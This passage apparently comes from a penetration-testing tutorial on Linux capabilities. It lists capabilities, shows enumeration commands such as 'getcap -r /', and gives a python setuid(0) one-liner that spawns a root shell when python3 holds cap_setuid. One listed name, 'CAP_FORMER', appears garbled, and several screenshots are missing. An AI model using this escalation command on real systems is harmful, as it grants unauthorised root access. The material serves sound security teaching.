CAP_SYS_TTY_CONFIG	employ various privileged ioctl(2) operations on virtual terminals
CAP_MKNOD	Create special files using mknod(2)
CAP_LEASE	Establish leases on arbitrary files (see fcntl(2))
CAP_SETFCAP	Set arbitrary capabilities on a file
CAP_MAC_OVERRIDE	Override Mandatory Access Control (MAC). Implemented for the Smack LSM.
CAP_SYSLOG	Perform privileged syslog(2) operations
CAP_WAKE_ALARM	Trigger something that will wake up the system (set CLOCK_REALTIME_ALARM and CLOCK_BOOTTIME_ALARM timers)
CAP_AUDIT_READ	Allow reading the audit log via a multicast netlink socket
CAP_PERFMON	Employ various performance-monitoring mechanisms
CAP_BPF	Employ privileged BPF operations; see bpf(2) and bpf-helpers(7)
CAP_CHECKPOINT_RESTORE	Update /proc/sys/kernel/ns_last_pid (see pid_namespaces(7)), employ the set_tid feature of clone3(2) and read the contents of the symbolic links for other processes
The following capabilities are particularly dangerous and should be investigated further if found enabled on a system:

CAP_CHOWN
CAP_DAC_OVERRIDE
CAP_DAC_READ_SEARCH
CAP_SETUID
CAP_SETGID
CAP_NET_RAW
CAP_SYS_ADMIN
CAP_SYS_PTRACE
CAP_SYS_MODULE
CAP_FORMER
CAP_SETFCAP
Identifying Misconfigured Vulnerabilities
The following command can be used to identify binaries that have capabilities allocated to them:

getcap -r / 2>/dev/null

Whereas the following command can be used to check whether a running process has capabilities assigned:

cat /proc/[process ID]/status | grep Cap
Capabilities assigned to users are stored in the /etc/security/capability.conf configuration file:


Additionally, systemd offers directives for configuring capabilities on service units, through the “AmbientCapabilities” variable:


The easiest way to identify misconfigured capabilities is to use enumeration scripts such as LinPEAS:


Once the capabilities have been assigned, a great resource to find out if they can be vulnerable (if assigned to variables) is through GTFOBins, as for each applicable binary it has a handy “Capabilities” section which shows how certain capabilities can be exploited to elevate privileges. This HackTricks page is also great. Alternatively, googling for the capability and the object it is assigned to normally does the trick.

Exploiting Misconfigured Vulnerabilities
Based on the output from the commands used above, the /usr/bin/python3.8 binary has the cap_setuid capabilities assigned, which allows to set the effective user ID of a process when running its binary i.e. executing binaries as root.

Aaccording to GTFOBins, it can be easily exploited with the following command, which simply executes /bin/sh with the SUID bit set:

/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

Executing the command while logged in as a non-root user:


As shown above, this has allowed to escalate privileges to root, many different capabilities can be exploited to read/write to files, intercept network traffic, mount/unmount file systems and more, which can potentially lead to escalation of privileges.

Conclusion
Capabilities can certainly be a very powerful tool for system administrators to be able to do their job and work around some of the restrictions of the Linux operating system, however, they should be carefully set as if misconfigured they could lead to a full system compromise.
